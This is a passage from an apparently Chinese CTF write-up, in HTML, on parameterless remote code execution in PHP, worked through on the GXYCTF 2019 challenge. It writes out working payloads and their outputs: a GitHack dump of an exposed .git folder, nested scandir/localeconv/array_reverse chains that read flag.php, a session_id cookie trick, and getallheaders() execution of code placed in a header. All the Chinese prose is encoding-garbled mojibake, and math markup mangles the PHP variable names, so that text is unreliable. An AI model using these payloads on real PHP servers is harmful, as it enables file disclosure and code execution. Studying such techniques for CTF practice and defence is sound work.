        <content type="html"><![CDATA[<h1 id="ç®€è¿°"><a class="markdownIt-Anchor" href="#ç®€è¿°">#</a> ç®€è¿°ï¼š</h1><p>â€‹é¦–å…ˆè¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ— å‚æ•° RCEï¼Œå¯¹äºå¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬é€šå¸¸é‡åˆ° PHP ä¸­å­˜åœ¨ eval å‡½æ•°çš„æ—¶å€™ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure><p>â€‹çš„ payload æ¥å®è¡Œæ”»å‡»çš„ï¼Œå¤§ä¸äº†å°±å‡ºç°äº†ä¸€äº› waf éœ€è¦ç»•è¿‡ã€‚ä½†æ˜¯ï¼Œæœ‰çš„æ—¶å€™ï¼Œä»–ä»¬ç›¸å…³çš„ waf ç‰¹åˆ«å¥‡è‘©ï¼Œåƒæ˜¯è¿‡æ»¤äº†æ‰€æœ‰çš„å­—æ¯ä»¥åŠæ•°å­—ä»€ä¹ˆçš„ï¼Œå¦å¤–ï¼Œå°±æ˜¯è¿™ç¯‡åšå®¢æœ€ä¸»è¦è¯´æ˜çš„é¢˜ç›®ï¼Œå°±æ˜¯æ— å‚æ•° RCEï¼š</p><p>â€‹åƒæ˜¯ä¸‹é¢çš„è¿™ä¸€ä¸ªæ­£åˆ™ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç»è¿‡äº†å®ƒçš„è¿‡æ»¤ä¹‹åï¼Œæœ€ååªæœ‰ a (b (c ()));è¿™æ ·çš„ payload æ‰ä¸ä¼šè¢«è¿‡æ»¤äº†ã€‚</p><blockquote><p>æ­£åˆ™è¡¨è¾¾å¼ [^\W]+((?R)?) åŒ¹é…äº†ä¸€ä¸ªæˆ–å¤šä¸ªéæ ‡ç‚¹ç¬¦å·å­—ç¬¦ï¼ˆè¡¨ç¤ºå‡½æ•°åï¼‰ï¼Œåè·Ÿä¸€ä¸ªæ‹¬å·ï¼ˆè¡¨ç¤ºå‡½æ•°è°ƒç”¨ï¼‰ã€‚å…¶ä¸­ (?R) æ˜¯é€’å½’å¼•ç”¨ï¼Œå®ƒåªèƒ½åŒ¹é…å’Œæ›¿æ¢åµŒå¥—çš„å‡½æ•°è°ƒç”¨ï¼Œè€Œä¸èƒ½å¤„ç†å‡½æ•°å‚æ•°ã€‚ä½¿ç”¨è¯¥æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæ›¿æ¢åï¼Œæ¯ä¸ªå‡½æ•°è°ƒç”¨éƒ½ä¼šè¢«åˆ é™¤ï¼Œåªå‰©ä¸‹ä¸€ä¸ªåˆ†å·ï¼›ï¼Œè€Œæœ€ç»ˆç»“æœå¼ºç­‰äºï¼›æ—¶ï¼Œpayload æ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥ã€‚ç®€è€Œè¨€ä¹‹ï¼Œæ— å‚æ•° rce å°±æ˜¯ä¸ä½¿ç”¨å‚æ•°ï¼Œè€Œåªä½¿ç”¨ä¸€ä¸ªä¸ªå‡½æ•°æœ€ç»ˆè¾¾åˆ°ç›®çš„ã€‚</p></blockquote><h1 id="ç›¸å…³å‡½æ•°è®²è§£"><a class="markdownIt-Anchor" href="#ç›¸å…³å‡½æ•°è®²è§£">#</a> ç›¸å…³å‡½æ•°è®²è§£ï¼š</h1><blockquote><ul><li>scandir () : å°†è¿”å›å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„åˆ—è¡¨ã€‚è¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•åç§°ï¼ˆglob () å¯æ›¿æ¢ï¼‰</li><li>localeconv () ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚ï¼ˆä½†æ˜¯è¿™é‡Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯â€˜.â€™ï¼Œè¿™ä¸ªã€‚çš„ç”¨å¤„å¾ˆå¤§ï¼‰</li><li>current () ï¼šè¿”å›æ•°ç»„ä¸­çš„å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚pos () å’Œ current () æ˜¯åŒä¸€ä¸ªä¸œè¥¿</li><li><span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1nZXRjd2QmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">getcwd</span> () : å–å¾—å½“å‰å·¥ä½œç›®å½•</li><li>dirname (): å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†</li><li>array_flip () : äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„</li><li>array_rand () : ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</li><li>array_reverse (): å°†æ•°ç»„å†…å®¹åè½¬</li><li>strrev (): ç”¨äºåè½¬ç»™å®šå­—ç¬¦ä¸²</li><li>getcwd ()ï¼šè·å–å½“å‰å·¥ä½œç›®å½•è·¯å¾„</li><li>dirname () ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</li><li>chdir () ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</li><li>eval ()ã€assert ()ï¼šå‘½ä»¤æ‰§è¡Œ</li><li>hightlight_file ()ã€show_source ()ã€readfile ()ï¼šè¯»å–æ–‡ä»¶å†…å®¹</li></ul></blockquote><p>â€‹æ•°ç»„ç§»åŠ¨æ“ä½œï¼š</p><blockquote><ul><li>end () ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li>next () ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li>prev () ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li>reset () ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li>each () ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</li></ul></blockquote><h1 id="é¢˜ç›®ç¤ºä¾‹gxyctf-2019ç¦æ­¢å¥—å¨ƒ"><a class="markdownIt-Anchor" href="#é¢˜ç›®ç¤ºä¾‹gxyctf-2019ç¦æ­¢å¥—å¨ƒ">#</a> é¢˜ç›®ç¤ºä¾‹ï¼š[GXYCTF 2019] ç¦æ­¢å¥—å¨ƒ</h1><p>â€‹å…ˆè¯´é¢˜ç›®ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªä¿¡æ¯æœé›†ï¼Œä¸è¿‡è¿™ä¸ªä¿¡æ¯æœé›†é€šè¿‡å¤šæ¬¡å°è¯•æˆ–è€…æ‰«åå°å‘ç°äº†.git/ æ–‡ä»¶å¤¹ï¼ŒçŒœæµ‹æ˜¯ git æ³„éœ²ï¼Œç›´æ¥ Githack ä¸‹æºç ï¼Œå¾—åˆ° index.php çš„å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\c\python tools\GitHack&gt;python GitHack.py http://node4.anna.nssctf.cn:28131/.git</span><br><span class="line">[+] Download and parse index file ...</span><br><span class="line">[+] flag.php</span><br><span class="line">[+] index.php</span><br><span class="line">[OK] flag.php</span><br><span class="line">[OK] index.php</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå¾—åˆ° Index.php æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œåªéœ€è¦å…³å¿ƒç¬¬äºŒå±‚ç»•è¿‡ï¼Œä¸»è¦è€ƒç‚¹åº”è¯¥æ˜¯è¿™ä¸€å±‚ï¼Œä¹Ÿå°±æ˜¯æ— å‚æ•° RCEã€‚</p><h1 id="1å¸¸è§„æ–¹æ³•"><a class="markdownIt-Anchor" href="#1å¸¸è§„æ–¹æ³•">#</a> 1. å¸¸è§„æ–¹æ³•ï¼š</h1><p>â€‹é€šå¸¸æƒ…å†µä¸‹ï¼Œ æˆ‘ä»¬æƒ³è¦è¯»å–è¯¥ç›®å½•çš„æ–‡ä»¶å†…å®¹ï¼Œé‚£ä¹ˆï¼Œå¸¸è§„çš„æ–¹æ³•å°±æ˜¯å¦‚ä¸‹ï¼Œä¸è¿‡ï¼Œå…ˆç»™ä¸€ä¸ª payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆï¼Œé€šè¿‡é€šè¿‡ localeconv () æ¥ ï¼Œè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œåˆå› ä¸ºæ•°ç»„çš„ç¬¬ä¸€é¡¹æ˜¯ '.ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ current () ï¼ˆè¿”å›æ•°ç»„ä¸­çš„å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼‰æ¥è·å–æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯é‚£ä¸€ä¸ªç‚¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload  ?exp=var_dump(localeconv());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">18</span>) &#123; [<span class="string">&quot;decimal_point&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="string">&quot;thousands_sep&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span> [<span class="string">&quot;int_curr_symbol&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span> [<span class="string">&quot;currency_symbol&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span> [<span class="string">&quot;mon_decimal_point&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span> [<span class="string">&quot;mon_thousands_sep&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span> [<span class="string">&quot;positive_sign&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span> [<span class="string">&quot;negative_sign&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span> [<span class="string">&quot;int_frac_digits&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">127</span>) [<span class="string">&quot;frac_digits&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">127</span>) [<span class="string">&quot;p_cs_precedes&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">127</span>) [<span class="string">&quot;p_sep_by_space&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">127</span>) [<span class="string">&quot;n_cs_precedes&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">127</span>) [<span class="string">&quot;n_sep_by_space&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">127</span>) [<span class="string">&quot;p_sign_posn&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">127</span>) [<span class="string">&quot;n_sign_posn&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">127</span>) [<span class="string">&quot;grouping&quot;</span>]=&gt; <span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125; [<span class="string">&quot;mon_grouping&quot;</span>]=&gt; <span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125; &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload = ?exp=var_dump(current(localeconv()));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//output  </span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åï¼Œé€šè¿‡ scandir () è¿”å›å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„åˆ—è¡¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//paylaod?exp=var_dump(scandir(current(localeconv())));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;.git&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;flag.php&quot;</span> [<span class="number">4</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;index.php&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>â€‹åˆšå¥½ï¼Œè¿™ä¸ªé¢˜ç›®ç¨å¾®å‡‘å·§äº†ï¼Œflag æ–‡ä»¶åˆšå¥½åœ¨å€’æ•°ç¬¬äºŒä¸ªæ–‡ä»¶ä¸­ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ array_reverse () æ¥åè½¬è¿™ä¸ªæ•°ç»„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//paylaod?exp=var_dump(array_reverse(scandir(current(localeconv()))));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;index.php&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;flag.php&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;.git&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">4</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åï¼Œé€šè¿‡ next () æ¥æ“ä½œæŒ‡é’ˆï¼ŒæŒ‡å‘ flag æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//paylaod?exp=var_dump(next(array_reverse(scandir(current(localeconv())))));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;flag.php&quot;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±å¯ä»¥é€šè¿‡ highlight_file () æ¥è¯»å– flag æ–‡ä»¶çš„å†…å®¹äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//paylaod?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;NSSCTF&#123;fe7192e9-edcb-4217-9bcf-220940f8c20d&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><h1 id="2session_id"><a class="markdownIt-Anchor" href="#2session_id">#</a> 2.session_id()</h1><p>â€‹ä½¿ç”¨æ¡ä»¶ï¼šå½“è¯·æ±‚å¤´ä¸­æœ‰ cookie æ—¶ï¼ˆæˆ–è€…èµ°æŠ•æ— è·¯æ‰‹åŠ¨æ·»åŠ  cookie å¤´ä¹Ÿè¡Œï¼Œæœ‰äº› CTF é¢˜ä¸ä¼šå¡ï¼‰</p><p>â€‹é¦–å…ˆæˆ‘ä»¬éœ€è¦å¼€å¯ session_start () æ¥ä¿è¯ session_id () çš„ä½¿ç”¨ï¼Œsession_id å¯ä»¥ç”¨æ¥è·å–å½“å‰ä¼šè¯ IDï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¯ä»¥æŠ“å– PHPSESSID åé¢çš„ä¸œè¥¿ï¼Œä½†æ˜¯ phpsession ä¸å…è®¸ () å‡ºç°<br>â€‹åœ¨ burp ä¸­ï¼Œæ„é€ ä¸€ä¸ª payload ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure><p>â€‹éšåï¼Œå°† Cookie æ”¹ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=flag.php </span><br></pre></td></tr></table></figure><p>â€‹æœ€åæˆåŠŸè¯»å–åˆ°äº† flag æ–‡ä»¶</p><h1 id="3getallheaders"><a class="markdownIt-Anchor" href="#3getallheaders">#</a> 3.getallheaders()</h1><p>â€‹getallheaders () è¿”å›å½“å‰è¯·æ±‚çš„æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯ï¼Œå±€é™äº Apacheï¼ˆapache_request_headers () å’Œ getallheaders () åŠŸèƒ½ç›¸ä¼¼ï¼Œå¯äº’ç›¸æ›¿ä»£ï¼Œä¸è¿‡ä¹Ÿæ˜¯å±€é™äº Apacheï¼‰</p><p>â€‹å½“ç¡®å®šèƒ½å¤Ÿè¿”å›æ—¶ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨æ•°æ®åŒ…æœ€åä¸€è¡ŒåŠ ä¸Šä¸€ä¸ªè¯·æ±‚å¤´ï¼Œå†™å…¥æ¶æ„ä»£ç ï¼Œå†ç”¨ end () å‡½æ•°æŒ‡å‘æœ€åä¸€ä¸ªè¯·æ±‚å¤´ï¼Œä½¿å…¶æ‰§è¡Œï¼Œpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br></pre></td></tr></table></figure><p>â€‹ä¸è¿‡ï¼Œè¿™ä¸ªé¢˜ç›®æˆ‘ç”¨è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™å¤±è´¥äº†ï¼Œå› ä¸ºç¬¬ä¸‰å±‚ç»•è¿‡è¿‡æ»¤äº† etï¼Œç„¶å get å•è¯å­˜åœ¨è¢«è¿‡æ»¤å•è¯ï¼Œæ— æ³•ç»•è¿‡ï¼Œæ‰€ä»¥ç”¨ä¸€ä¸‹åˆ«äººçš„å›¾ç‰‡ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/8c3f2e46a74540bca932fdbf51cbb0e9.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="4get_defined_vars"><a class="markdownIt-Anchor" href="#4get_defined_vars">#</a> 4.get_defined_vars()</h1><p>â€‹ç›¸è¾ƒäº getallheadersï¼ˆï¼‰æ›´åŠ å…·æœ‰æ™®éæ€§ï¼Œå®ƒå¯ä»¥å›æ˜¾å…¨å±€å˜é‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mtext>ã€</mtext></mrow><annotation encoding="application/x-tex">_GETã€</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">G</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback">ã€</span></span></span></span>_POSTã€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>F</mi></msub><mi>I</mi><mi>L</mi><mi>E</mi><mi>S</mi><mtext>ã€</mtext></mrow><annotation encoding="application/x-tex">_FILESã€</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">ã€</span></span></span></span>_COOKIEï¼Œ</p><p>è¿”å›æ•°ç»„é¡ºåºä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo>âˆ’</mo><mo>âˆ’</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">_GET--&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">G</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">âˆ’</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>_POSTâ€“&gt;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>C</mi></msub><mi>O</mi><mi>O</mi><mi>K</mi><mi>I</mi><mi>E</mi><mo>âˆ’</mo><mo>âˆ’</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">_COOKIE--&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 